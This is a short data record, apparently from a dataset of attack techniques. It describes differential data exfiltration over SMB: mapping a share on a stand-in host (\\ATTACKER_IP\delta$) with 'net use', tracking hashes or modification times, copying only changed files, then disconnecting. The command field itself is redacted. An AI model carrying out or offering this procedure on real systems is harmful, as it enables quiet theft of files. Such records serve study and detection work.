command: [REDACTED: Non-executable placeholder] Differential exfil: map \\ATTACKER_IP\delta$ with 'net use', track hashes/mtime to identify new files, copy only deltas to UNC, and disconnect.
explanation: Describes an automated approach that minimizes noise by sending only changed files over an SMB share established via 'net use'.
rationale_steps: Map the attacker-controlled share using net use
Compute or compare metadata to find newly changed files
Copy only the differential set to the UNC path
Tear down the SMB mapping and update local state
